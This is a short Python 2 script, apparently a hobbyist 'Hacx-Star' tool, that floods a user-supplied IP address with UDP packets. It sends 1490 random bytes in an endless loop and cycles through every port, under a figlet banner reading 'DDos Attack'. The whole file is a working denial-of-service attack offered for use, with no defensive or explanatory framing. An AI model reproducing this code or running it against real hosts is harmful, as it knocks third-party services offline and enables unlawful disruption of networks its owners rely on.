import os
#######
import random
#######
import socket
#######
import time
os.system("apt-get install figlet")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("figlet DDos Attack")
print
print "                   Hacx-Star"
print
print "You Tube : https://youtube.com/channel/UCJn2-qHoPUSgWe2focJVeUQ"
print
print "github   : https://github.com/Hacx-Star"
print
print "================================"
print
ip = raw_input("IP Target : ")
port = input("Port      : ")

os.system("clear")
os.system("figlet Attack Starting")
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
